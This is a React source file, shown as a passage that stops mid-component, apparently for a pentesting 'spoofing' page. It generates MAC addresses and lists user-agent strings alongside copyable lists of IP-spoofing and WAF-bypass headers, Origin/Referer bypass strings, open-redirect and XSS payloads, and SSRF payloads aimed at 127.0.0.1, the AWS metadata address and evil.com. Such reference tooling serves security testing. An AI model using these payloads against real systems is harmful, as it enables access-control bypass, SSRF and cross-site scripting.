import { useState, useMemo, useCallback } from "react";
import { Card } from "../components/ui/Card.jsx";
import { Input } from "../components/ui/Input.jsx";
import { CopyButton } from "../components/ui/CopyButton.jsx";
import {
  VenetianMask,
  RefreshCw,
  Search,
  Server,
  Check,
  X,
  Shuffle,
} from "lucide-react";

const mono = "JetBrains Mono, monospace";
const heading = "Space Grotesk, sans-serif";

const ACCENT = "#F472B6";
const BG_INPUT = "#0B0F18";

const TABS = [
  { value: "mac", label: "MAC Spoofer" },
  { value: "ua", label: "User-Agent" },
  { value: "ip", label: "IP Spoofing" },
  { value: "referer", label: "Referer/Origin" },
  { value: "dns", label: "DNS Reference" },
];

// ─────────────────────────────────────────────
// MAC Address Data & Helpers
// ─────────────────────────────────────────────

const VENDORS = [
  { name: "Apple", prefix: "AC:DE:48" },
  { name: "Samsung", prefix: "8C:F5:A3" },
  { name: "Intel", prefix: "00:1B:21" },
  { name: "Cisco", prefix: "00:1A:A1" },
  { name: "Dell", prefix: "00:14:22" },
  { name: "HP", prefix: "3C:D9:2B" },
  { name: "Lenovo", prefix: "00:06:1B" },
  { name: "Asus", prefix: "00:1A:92" },
  { name: "TP-Link", prefix: "50:C7:BF" },
  { name: "Netgear", prefix: "00:1E:2A" },
  { name: "Huawei", prefix: "00:E0:FC" },
  { name: "Google", prefix: "F4:F5:D8" },
  { name: "Microsoft", prefix: "00:50:F2" },
  { name: "Sony", prefix: "00:1A:80" },
  { name: "LG", prefix: "00:AA:70" },
  { name: "Xiaomi", prefix: "64:CC:2E" },
  { name: "Raspberry Pi", prefix: "B8:27:EB" },
  { name: "VMware", prefix: "00:50:56" },
  { name: "Amazon", prefix: "40:B4:CD" },
  { name: "Nintendo", prefix: "00:1F:32" },
];

const OUI_MAP = {};
VENDORS.forEach((v) => {
  OUI_MAP[v.prefix.toUpperCase()] = v.name;
});

function randomHex() {
  return Math.floor(Math.random() * 256)
    .toString(16)
    .padStart(2, "0")
    .toUpperCase();
}

function generateMac(prefix) {
  if (prefix) {
    const parts = prefix.split(":");
    while (parts.length < 6) parts.push(randomHex());
    return parts.join(":");
  }
  return Array.from({ length: 6 }, randomHex).join(":");
}

function isValidMac(mac) {
  return (
    /^([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}$/.test(mac.trim()) ||
    /^[0-9A-Fa-f]{12}$/.test(mac.trim())
  );
}

function normalizeMac(mac) {
  const clean = mac.replace(/[:\-\s]/g, "").toUpperCase();
  if (clean.length !== 12) return null;
  return clean.match(/.{2}/g).join(":");
}

function macFormats(mac) {
  const n = normalizeMac(mac);
  if (!n) return null;
  const parts = n.split(":");
  return {
    colon: parts.join(":"),
    dash: parts.join("-"),
    bare: parts.join(""),
  };
}

function lookupOui(mac) {
  const n = normalizeMac(mac);
  if (!n) return null;
  const prefix = n.split(":").slice(0, 3).join(":");
  return OUI_MAP[prefix] || null;
}

// ─────────────────────────────────────────────
// User-Agent Library
// ─────────────────────────────────────────────

const UA_LIBRARY = [
  {
    cat: "Desktop - Chrome",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  },
  {
    cat: "Desktop - Chrome",
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  },
  {
    cat: "Desktop - Chrome",
    ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  },
  {
    cat: "Desktop - Chrome",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  },
  {
    cat: "Desktop - Chrome",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
  },
  {
    cat: "Desktop - Firefox",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  },
  {
    cat: "Desktop - Firefox",
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
  },
  {
    cat: "Desktop - Firefox",
    ua: "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
  },
  {
    cat: "Desktop - Firefox",
    ua: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
  },
  {
    cat: "Desktop - Safari",
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  },
  {
    cat: "Desktop - Safari",
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  },
  {
    cat: "Desktop - Edge",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
  },
  {
    cat: "Desktop - Edge",
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
  },
  {
    cat: "Desktop - Opera",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
  },
  {
    cat: "Desktop - Opera",
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
  },
  {
    cat: "Desktop - Brave",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/1.61",
  },
  {
    cat: "Desktop - Vivaldi",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5",
  },
  {
    cat: "Mobile - iOS",
    ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  },
  {
    cat: "Mobile - iOS",
    ua: "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  },
  {
    cat: "Mobile - iOS",
    ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
  },
  {
    cat: "Mobile - Android",
    ua: "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
  },
  {
    cat: "Mobile - Android",
    ua: "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
  },
  {
    cat: "Mobile - Android",
    ua: "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
  },
  {
    cat: "Mobile - Samsung",
    ua: "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
  },
  {
    cat: "Mobile - Samsung",
    ua: "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
  },
  {
    cat: "Bots - Google",
    ua: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  },
  {
    cat: "Bots - Google",
    ua: "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  },
  { cat: "Bots - Google", ua: "Googlebot-Image/1.0" },
  {
    cat: "Bots - Bing",
    ua: "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  },
  {
    cat: "Bots - Bing",
    ua: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36",
  },
  {
    cat: "Bots - Yahoo",
    ua: "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  },
  {
    cat: "Bots - DuckDuckGo",
    ua: "DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)",
  },
  {
    cat: "Bots - Facebook",
    ua: "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  },
  { cat: "Bots - Facebook", ua: "facebookexternalhit/1.1" },
  { cat: "Bots - Twitter", ua: "Twitterbot/1.0" },
  {
    cat: "Bots - LinkedIn",
    ua: "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
  },
  {
    cat: "Bots - Slack",
    ua: "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
  },
  { cat: "Bots - Telegram", ua: "TelegramBot (like TwitterBot)" },
  {
    cat: "Bots - SEO",
    ua: "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
  },
  {
    cat: "Bots - SEO",
    ua: "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
  },
  { cat: "Tools - curl", ua: "curl/8.4.0" },
  { cat: "Tools - curl", ua: "curl/7.88.1" },
  { cat: "Tools - wget", ua: "Wget/1.21.4" },
  { cat: "Tools - Python", ua: "python-requests/2.31.0" },
  { cat: "Tools - Python", ua: "Python-urllib/3.12" },
  { cat: "Tools - Python", ua: "aiohttp/3.9.1" },
  {
    cat: "Tools - Burp",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 BurpSuite/2024.1",
  },
  {
    cat: "Tools - Nmap",
    ua: "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
  },
  {
    cat: "Tools - Nikto",
    ua: "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)",
  },
  { cat: "Tools - SQLmap", ua: "sqlmap/1.7.12#stable (https://sqlmap.org)" },
  { cat: "Tools - Scrapy", ua: "Scrapy/2.11.0 (+https://scrapy.org)" },
  { cat: "Tools - Postman", ua: "PostmanRuntime/7.36.0" },
  { cat: "Tools - HTTPie", ua: "HTTPie/3.2.2" },
  { cat: "Tools - Go", ua: "Go-http-client/2.0" },
  {
    cat: "Exotic - PS5",
    ua: "Mozilla/5.0 (PlayStation 5 4.02) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
  },
  {
    cat: "Exotic - PS4",
    ua: "Mozilla/5.0 (PlayStation 4 11.00) AppleWebKit/605.1.15 (KHTML, like Gecko)",
  },
  {
    cat: "Exotic - Xbox",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edge/44.18363.8131",
  },
  {
    cat: "Exotic - Switch",
    ua: "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.21.4 NintendoBrowser/5.1.0.22474",
  },
  {
    cat: "Exotic - Smart TV",
    ua: "Mozilla/5.0 (SMART-TV; LINUX; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) 94.0.4606.31/7.0 TV Safari/537.36",
  },
  {
    cat: "Exotic - Smart TV",
    ua: "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.128 Safari/537.36 WebAppManager",
  },
  {
    cat: "Exotic - Kindle",
    ua: "Mozilla/5.0 (Linux; Android 11; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/120.4.1 like Chrome/120.0.6099.144 Safari/537.36",
  },
  {
    cat: "Exotic - Alexa",
    ua: "Mozilla/5.0 (Linux;Android 5.1.1) AppleWebKit/537.36(KHTML, like Gecko) Version/4.0 Focus/6.4 Chrome/120.0.0.0 Safari/537.36 AlexaWebView",
  },
  { cat: "Exotic - Roku", ua: "Roku4640X/DVP-12.0 (12.0.0.4194)" },
  {
    cat: "Exotic - Tesla",
    ua: "Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Tesla QtCarBrowser Safari/601.1",
  },
];

function parseUserAgent(ua) {
  const info = {
    browser: "Unknown",
    version: "",
    os: "Unknown",
    device: "Desktop",
  };
  if (/iPhone|iPad|iPod/.test(ua)) {
    info.device = "Mobile";
    info.os = "iOS";
  } else if (/Android/.test(ua)) {
    info.device = "Mobile";
    info.os = "Android";
  } else if (/Windows NT/.test(ua)) info.os = "Windows";
  else if (/Macintosh|Mac OS X/.test(ua)) info.os = "macOS";
  else if (/Linux/.test(ua)) info.os = "Linux";
  else if (/PlayStation/.test(ua)) {
    info.os = "PlayStation";
    info.device = "Console";
  } else if (/Xbox/.test(ua)) {
    info.os = "Xbox";
    info.device = "Console";
  } else if (/Nintendo/.test(ua)) {
    info.os = "Nintendo";
    info.device = "Console";
  } else if (/SMART-TV|SmartTV|Tizen|Web0S/.test(ua)) {
    info.os = "Smart TV";
    info.device = "TV";
  }

  if (/SamsungBrowser\/(\S+)/.test(ua)) {
    info.browser = "Samsung Internet";
    info.version = RegExp.$1;
  } else if (/Edg\/(\S+)/.test(ua)) {
    info.browser = "Edge";
    info.version = RegExp.$1;
  } else if (/OPR\/(\S+)/.test(ua)) {
    info.browser = "Opera";
    info.version = RegExp.$1;
  } else if (/Brave\/(\S+)/.test(ua)) {
    info.browser = "Brave";
    info.version = RegExp.$1;
  } else if (/Vivaldi\/(\S+)/.test(ua)) {
    info.browser = "Vivaldi";
    info.version = RegExp.$1;
  } else if (/Firefox\/(\S+)/.test(ua)) {
    info.browser = "Firefox";
    info.version = RegExp.$1;
  } else if (/Version\/(\S+).*Safari/.test(ua)) {
    info.browser = "Safari";
    info.version = RegExp.$1;
  } else if (/Chrome\/(\S+)/.test(ua)) {
    info.browser = "Chrome";
    info.version = RegExp.$1;
  } else if (/Googlebot/.test(ua)) {
    info.browser = "Googlebot";
    info.device = "Bot";
  } else if (/bingbot/.test(ua)) {
    info.browser = "Bingbot";
    info.device = "Bot";
  } else if (/curl/.test(ua)) {
    info.browser = "curl";
    info.device = "CLI";
  } else if (/python-requests/.test(ua)) {
    info.browser = "python-requests";
    info.device = "CLI";
  } else if (/Silk\/(\S+)/.test(ua)) {
    info.browser = "Silk";
    info.version = RegExp.$1;
    info.device = "Tablet";
  }

  return info;
}

// ─────────────────────────────────────────────
// IP Spoofing Headers
// ─────────────────────────────────────────────

const IP_HEADERS = [
  "X-Forwarded-For",
  "X-Real-IP",
  "X-Originating-IP",
  "X-Remote-IP",
  "X-Remote-Addr",
  "X-Client-IP",
  "True-Client-IP",
  "Cluster-Client-IP",
  "X-Cluster-Client-IP",
  "Forwarded",
  "X-Forwarded",
  "Forwarded-For",
  "X-Forwarded-Host",
  "X-Forwarded-Server",
  "X-Host",
  "X-HTTP-Host-Override",
  "X-Custom-IP-Authorization",
  "X-Original-URL",
  "X-Rewrite-URL",
  "X-Proxy-URL",
];

const IP_VALUES = [
  "127.0.0.1",
  "10.0.0.1",
  "192.168.1.1",
  "0.0.0.0",
  "::1",
  "localhost",
  "172.16.0.1",
  "192.168.0.1",
  "10.10.10.1",
  "127.1",
  "127.0.0.0",
  "2130706433",
  "017700000001",
  "0x7f000001",
];

const WAF_BYPASS_HEADERS = [
  { header: "X-Original-URL: /admin", desc: "Nginx/IIS URL override" },
  { header: "X-Rewrite-URL: /admin", desc: "IIS URL rewrite override" },
  {
    header: "X-Custom-IP-Authorization: 127.0.0.1",
    desc: "Custom auth bypass",
  },
  { header: "X-Forwarded-Proto: https", desc: "Protocol override" },
  { header: "X-Forwarded-Port: 443", desc: "Port override" },
  { header: "X-ProxyUser-Ip: 127.0.0.1", desc: "GCP proxy user IP" },
  { header: "X-Original-Host: internal.app", desc: "Host override" },
  {
    header: "X-WAP-Profile: http://evil.com/wap.xml",
    desc: "WAP profile SSRF",
  },
  { header: "X-Arbitrary: http://evil.com", desc: "Arbitrary header SSRF" },
  {
    header: "X-HTTP-DestinationURL: http://evil.com",
    desc: "Destination URL override",
  },
  { header: "X-Forwarded-By: 127.0.0.1", desc: "Forwarded by proxy" },
  { header: "X-BlueCoat-Via: 127.0.0.1", desc: "BlueCoat proxy header" },
  { header: "CF-Connecting-IP: 127.0.0.1", desc: "Cloudflare IP override" },
  { header: "Fastly-Client-IP: 127.0.0.1", desc: "Fastly CDN IP override" },
  { header: "Akamai-Origin-Hop: 127.0.0.1", desc: "Akamai CDN hop" },
];

// ─────────────────────────────────────────────
// Referer/Origin Spoofing
// ─────────────────────────────────────────────

const REFERER_PAYLOADS = [
  { payload: "Referer: https://target.com", desc: "Match the target domain" },
  { payload: "Referer: https://target.com/admin", desc: "Admin path referer" },
  { payload: "Referer: ", desc: "Empty referer" },
  {
    payload: "(no Referer header)",
    desc: "Remove referer entirely (use -H 'Referer:' in curl)",
  },
  { payload: "Referer: null", desc: "Null referer string" },
  {
    payload: "Referer: data:text/html,<h1>test</h1>",
    desc: "Data URI referer",
  },
  { payload: "Referer: about:blank", desc: "about:blank referer" },
  {
    payload: "Referer: https://target.com.evil.com",
    desc: "Subdomain confusion",
  },
  { payload: "Referer: https://evil.com/target.com", desc: "Path confusion" },
  {
    payload: "Referer: https://evil.com?q=target.com",
    desc: "Query param confusion",
  },
  {
    payload: "Referer: https://evil.com#target.com",
    desc: "Fragment confusion",
  },
  {
    payload: "Referer: https://evil.com\\@target.com",
    desc: "Backslash auth bypass",
  },
  {
    payload: "Referer: javascript:alert(1)",
    desc: "JavaScript protocol referer",
  },
];

const ORIGIN_PAYLOADS = [
  { payload: "Origin: https://target.com", desc: "Match target origin" },
  {
    payload: "Origin: null",
    desc: "Null origin (sandboxed iframe, data: URI)",
  },
  {
    payload: "Origin: https://target.com.evil.com",
    desc: "Subdomain of attacker with target prefix",
  },
  { payload: "Origin: https://evil-target.com", desc: "Similar domain" },
  {
    payload: "Origin: https://target.com%60.evil.com",
    desc: "Backtick bypass",
  },
  {
    payload: "Origin: https://target.com%2f.evil.com",
    desc: "Encoded slash bypass",
  },
  {
    payload: "Origin: https://target.com_.evil.com",
    desc: "Underscore bypass",
  },
  {
    payload: "Origin: https://target.com!.evil.com",
    desc: "Exclamation bypass",
  },
  { payload: "Origin: https://attacker.com", desc: "Reflected origin test" },
  {
    payload: 'Origin: https://evil.com" onmouseover="alert(1)',
    desc: "XSS via CORS reflection",
  },
];

const REDIRECT_PAYLOADS = [
  { payload: "//evil.com", desc: "Protocol-relative redirect" },
  { payload: "/\\evil.com", desc: "Backslash redirect" },
  { payload: "/%2f%2fevil.com", desc: "Double-encoded redirect" },
  { payload: "///evil.com", desc: "Triple-slash redirect" },
  { payload: "/redirect?url=https://evil.com", desc: "Common redirect param" },
  { payload: "https://target.com@evil.com", desc: "At-sign redirect" },
  { payload: "https://target.com%40evil.com", desc: "Encoded @ redirect" },
  { payload: "java%0d%0ascript:alert(1)", desc: "CRLF + javascript proto" },
];

const SSRF_REFERER = [
  {
    payload: "Referer: http://127.0.0.1:8080/admin",
    desc: "SSRF to internal admin",
  },
  {
    payload: "Referer: http://169.254.169.254/latest/meta-data/",
    desc: "AWS metadata via referer",
  },
  { payload: "Referer: http://[::1]:8080/", desc: "IPv6 loopback SSRF" },
  { payload: "Referer: http://0x7f000001/", desc: "Hex IP SSRF" },
  { payload: "Referer: http://0177.0.0.1/", desc: "Octal IP SSRF" },
  {
    payload: "Referer: dict://127.0.0.1:11211/stat",
    desc: "Dict protocol SSRF",
  },
  { payload: "Referer: gopher://127.0.0.1:25/", desc: "Gopher protocol SSRF" },
];

// ─────────────────────────────────────────────
// DNS Reference Data
// ─────────────────────────────────────────────

const DNS_RECORD_TYPES = [
  { type: "A", desc: "IPv4 address record" },
  { type: "AAAA", desc: "IPv6 address record" },
  { type: "CNAME", desc: "Canonical name (alias)" },
  { type: "MX", desc: "Mail exchange server" },
  { type: "NS", desc: "Name server" },
  { type: "TXT", desc: "Text record (SPF, DKIM, etc.)" },
  { type: "SOA", desc: "Start of authority" },
  { type: "PTR", desc: "Pointer (reverse DNS)" },
  { type: "SRV", desc: "Service location" },
  { type: "CAA", desc: "Certificate Authority Authorization" },
  { type: "DNSKEY", desc: "DNSSEC key" },
  { type: "DS", desc: "Delegation signer (DNSSEC)" },
  { type: "NAPTR", desc: "Naming authority pointer" },
  { type: "HINFO", desc: "Host information" },
  { type: "ANY", desc: "All records (often blocked)" },
];

// ─────────────────────────────────────────────
// Shared UI Components
// ─────────────────────────────────────────────

function SectionTitle({ children }) {
  return (
    <h3
      style={{
        fontFamily: heading,
        fontSize: 14,
        fontWeight: 600,
        color: "#E5E7EB",
        margin: "0 0 10px 0",
      }}
    >
      {children}
    </h3>
  );
}

function CodeBlock({ code, label }) {
  return (
    <div style={{ position: "relative", marginBottom: 10 }}>
      {label && (
        <div
          style={{
            fontFamily: mono,
            fontSize: 9,
            color: "#6B7280",
            textTransform: "uppercase",
            letterSpacing: "0.06em",
            marginBottom: 4,
          }}
        >
          {label}
        </div>
      )}
      <div
        style={{
          display: "flex",
          alignItems: "flex-start",
          gap: 6,
          background: BG_INPUT,
          borderRadius: 8,
          padding: "10px 12px",
          border: "1px solid rgba(255,255,255,0.04)",
        }}
      >
        <code
          style={{
            fontFamily: mono,
            fontSize: 11,
            color: "#E2E8F0",
            lineHeight: 1.6,
            whiteSpace: "pre-wrap",
            wordBreak: "break-all",
            flex: 1,
          }}
        >
          {code}
        </code>
        <CopyButton text={code} />
      </div>
    </div>
  );
}

function PayloadRow({ text, desc }) {
  return (
    <div
      style={{
        display: "flex",
        alignItems: "center",
        gap: 8,
        padding: "8px 12px",
        borderBottom: "1px solid rgba(255,255,255,0.04)",
      }}
    >
      <code
        style={{
          fontFamily: mono,
          fontSize: 11,
          color: "#E2E8F0",
          flex: 1,
          wordBreak: "break-all",
        }}
      >
        {text}
      </code>
      {desc && (
        <span
          style={{
            fontFamily: mono,
            fontSize: 9,
            color: "#6B7280",
            flexShrink: 0,
            maxWidth: 180,
            textAlign: "right",
          }}
        >
          {desc}
        </span>
      )}
      <CopyButton text={text} />
    </div>
  );
}

function PillButton({ active, onClick, children, accent = ACCENT }) {
  return (
    <button
      onClick={onClick}
      style={{
        padding: "5px 12px",
        borderRadius: 6,
        border: "none",
        cursor: "pointer",
        fontFamily: mono,
        fontSize: 10,
        fontWeight: 600,
        background: active ? `${accent}18` : "rgba(255,255,255,0.03)",
        color: active ? accent : "#6B7280",
        transition: "all 100ms",
      }}
    >
      {children}
    </button>
  );
}

// ─────────────────────────────────────────────
// Tab: MAC Address Spoofer
// ─────────────────────────────────────────────

function MacTab() {
  const [mac, setMac] = useState(() => generateMac());
  const [vendor, setVendor] = useState("");
  const [customMac, setCustomMac] = useState("");
  const [lookupInput, setLookupInput] = useState("");

  const regen = useCallback(() => {
    const v = VENDORS.find((x) => x.name === vendor);
    setMac(generateMac(v ? v.prefix : undefined));
  }, [vendor]);

  const formats = macFormats(mac);
  const lookupResult = lookupInput ? lookupOui(lookupInput) : null;
  const customValid = customMac ? isValidMac(customMac) : null;
  const activeMac = customValid ? normalizeMac(customMac) : mac;

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <Card style={{ padding: 20 }}>
        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 12,
            marginBottom: 16,
          }}
        >
          <SectionTitle>Random MAC Generator</SectionTitle>
          <button
            onClick={regen}
            style={{
              display: "flex",
              alignItems: "center",
              gap: 6,
              padding: "6px 14px",
              borderRadius: 8,
              border: "none",
              cursor: "pointer",
              fontFamily: mono,
              fontSize: 11,
              fontWeight: 600,
              background: `${ACCENT}18`,
              color: ACCENT,
            }}
          >
            <RefreshCw size={12} /> Generate
          </button>
        </div>

        <div
          style={{
            background: BG_INPUT,
            borderRadius: 10,
            padding: "16px 20px",
            marginBottom: 16,
            border: `1px solid ${ACCENT}25`,
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
          }}
        >
          <code
            style={{
              fontFamily: mono,
              fontSize: 20,
              fontWeight: 700,
              color: ACCENT,
              letterSpacing: "0.05em",
            }}
          >
            {mac}
          </code>
          <CopyButton text={mac} />
        </div>

        <div style={{ marginBottom: 16 }}>
          <div
            style={{
              fontFamily: mono,
              fontSize: 9,
              color: "#6B7280",
              textTransform: "uppercase",
              letterSpacing: "0.06em",
              marginBottom: 8,
            }}
          >
            Vendor Prefix
          </div>
          <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
            <PillButton
              active={vendor === ""}
              onClick={() => {
                setVendor("");
              }}
            >
              Random
            </PillButton>
            {VENDORS.map((v) => (
              <PillButton
                key={v.name}
                active={vendor === v.name}
                onClick={() => setVendor(v.name)}
              >
                {v.name}
              </PillButton>
            ))}
          </div>
        </div>

        {formats && (
          <div
            style={{
              display: "grid",
              gridTemplateColumns: "repeat(3, 1fr)",
              gap: 10,
            }}
          >
            <CodeBlock label="Colon format" code={formats.colon} />
            <CodeBlock label="Dash format" code={formats.dash} />
            <CodeBlock label="Bare format" code={formats.bare} />
          </div>
        )}
      </Card>

      <Card style={{ padding: 20 }}>
        <SectionTitle>Custom MAC Validation</SectionTitle>
        <div
          style={{
            display: "flex",
            gap: 10,
            alignItems: "flex-end",
            marginBottom: 12,
          }}
        >
          <div style={{ flex: 1 }}>
            <Input
              label="Enter MAC address"
              value={customMac}
              onChange={(e) => setCustomMac(e.target.value)}
              placeholder="AA:BB:CC:DD:EE:FF"
            />
          </div>
          {customValid !== null && (
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 4,
                padding: "8px 0",
              }}
            >
              {customValid ? (
                <Check size={16} style={{ color: "#34D399" }} />
              ) : (
                <X size={16} style={{ color: "#F87171" }} />
              )}
              <span
                style={{
                  fontFamily: mono,
                  fontSize: 11,
                  color: customValid ? "#34D399" : "#F87171",
                }}
              >
                {customValid ? "Valid" : "Invalid"}
              </span>
            </div>
          )}
        </div>
      </Card>

      <Card style={{ padding: 20 }}>
        <SectionTitle>OS Commands</SectionTitle>
        <CodeBlock
          label="Linux"
          code={`sudo ip link set dev eth0 down && sudo ip link set dev eth0 address ${activeMac} && sudo ip link set dev eth0 up`}
        />
        <CodeBlock
          label="macOS"
          code={`sudo ifconfig en0 ether ${activeMac}`}
        />
        <CodeBlock
          label="Windows (PowerShell)"
          code={`Set-NetAdapter -Name "Ethernet" -MacAddress "${activeMac.replace(/:/g, "-")}"\n\n# Or via Registry:\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-...}\\00XX\n# Add string value: NetworkAddress = ${formats ? formats.bare : activeMac.replace(/:/g, "")}`}
        />
      </Card>

      <Card style={{ padding: 20 }}>
        <SectionTitle>OUI Lookup</SectionTitle>
        <div style={{ display: "flex", gap: 10, alignItems: "flex-end" }}>
          <div style={{ flex: 1 }}>
            <Input
              label="Paste a MAC to identify vendor"
              value={lookupInput}
              onChange={(e) => setLookupInput(e.target.value)}
              placeholder="00:1A:A1:XX:XX:XX"
            />
          </div>
          {lookupInput && (
            <div style={{ padding: "8px 0" }}>
              <span
                style={{
                  fontFamily: mono,
                  fontSize: 12,
                  fontWeight: 600,
                  color: lookupResult ? "#34D399" : "#F87171",
                }}
              >
                {lookupResult || "Unknown vendor"}
              </span>
            </div>
          )}
        </div>
      </Card>
    </div>
  );
}

// ─────────────────────────────────────────────
// Tab: User-Agent Spoofer
// ─────────────────────────────────────────────

function UaTab() {
  const [search, setSearch] = useState("");
  const [activeCat, setActiveCat] = useState(null);
  const [parseInput, setParseInput] = useState("");

  const categories = useMemo(
    () => [...new Set(UA_LIBRARY.map((u) => u.cat))],
    [],
  );

  const filtered = useMemo(() => {
    return UA_LIBRARY.filter((u) => {
      if (activeCat && u.cat !== activeCat) return false;
      if (!search) return true;
      const q = search.toLowerCase();
      return u.ua.toLowerCase().includes(q) || u.cat.toLowerCase().includes(q);
    });
  }, [search, activeCat]);

  const randomUa = useCallback(() => {
    const item = UA_LIBRARY[Math.floor(Math.random() * UA_LIBRARY.length)];
    setSearch("");
    setActiveCat(null);
    setParseInput(item.ua);
  }, []);

  const parsed = parseInput ? parseUserAgent(parseInput) : null;

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <div style={{ display: "flex", gap: 10, alignItems: "center" }}>
        <div
          style={{
            flex: 1,
            display: "flex",
            alignItems: "center",
            gap: 8,
            background: "#11151E",
            border: "1px solid rgba(255,255,255,0.04)",
            borderRadius: 8,
            padding: "8px 14px",
          }}
        >
